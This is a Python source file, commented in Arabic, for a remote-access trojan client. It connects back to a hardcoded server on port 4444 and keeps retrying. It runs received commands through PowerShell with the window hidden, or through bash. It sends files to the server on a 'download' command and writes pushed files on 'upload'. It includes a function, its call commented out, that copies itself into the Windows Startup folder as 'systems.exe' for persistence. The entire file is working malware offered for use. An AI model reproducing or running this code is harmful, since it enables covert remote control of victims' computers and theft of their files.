import socket
import subprocess
import os
import sys
import shutil
import time

HOST = "192.168.1.4"   # عدّل حسب IP السيرفر
PORT = 4444
BUF = 4096

def exec_command(cmd):
    if cmd.strip().lower().startswith("cd "):
        path = cmd[3:].strip().strip('"').strip("'")
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[cd error] {e}"

    try:
        if os.name == "nt":  # Windows
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return result.stdout.decode("utf-8", errors="replace") or "[*] no output"
        else:  # Linux/macOS
            result = subprocess.run(
                cmd,
                shell=True,
                executable="/bin/bash",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            return result.stdout.decode("utf-8", errors="replace") or "[*] no output"
    except Exception as e:
        return f"[exec error] {e}"

def handle_session(sock):
    while True:
        try:
            data = sock.recv(BUF).decode("utf-8", errors="ignore")
            if not data:
                break
            if data.lower() == "exit":
                break

            # download → client يرسل ملف للسيرفر
            if data.lower().startswith("download "):
                filename = data.split(" ", 1)[1]
                try:
                    with open(filename, "rb") as f:
                        while True:
                            chunk = f.read(BUF)
                            if not chunk:
                                break
                            sock.sendall(chunk)
                    sock.sendall(b"<<END>>")
                except Exception as e:
                    sock.sendall(f"[download error] {e}".encode())
                continue

            # upload → client يستقبل ملف من السيرفر
            if data.lower().startswith("upload "):
                filename = data.split(" ", 1)[1]
                with open(filename, "wb") as f:
                    while True:
                        chunk = sock.recv(BUF)
                        if chunk.endswith(b"<<END>>"):
                            f.write(chunk[:-7])
                            break
                        f.write(chunk)
                continue

            # أوامر عادية
            result = exec_command(data)
            sock.sendall(result.encode("utf-8"))
        except Exception:
            break

def run_client_forever():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print("[+] Connected to server")
            handle_session(s)
        except Exception:
            time.sleep(3)
        finally:
            try:
                s.close()
            except:
                pass
            print("[*] Disconnected, retrying...")

def copy_tostartup():
    if getattr(sys, 'frozen', False):
        current_file = sys.executable
    else:
        current_file = os.path.abspath(__file__)

    startup_path = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    destination = os.path.join(startup_path, "systems.exe")

    try:
        if not os.path.exists(destination):
            shutil.copy(current_file, destination)
            print(f"تم نسخ الملف إلى: {destination}")
        else:
            print("الملف موجود بالفعل في Startup.")
    except Exception as e:
        print("حصل خطأ:", e)

if __name__ == "__main__":
    run_client_forever()
    # copy_tostartup()
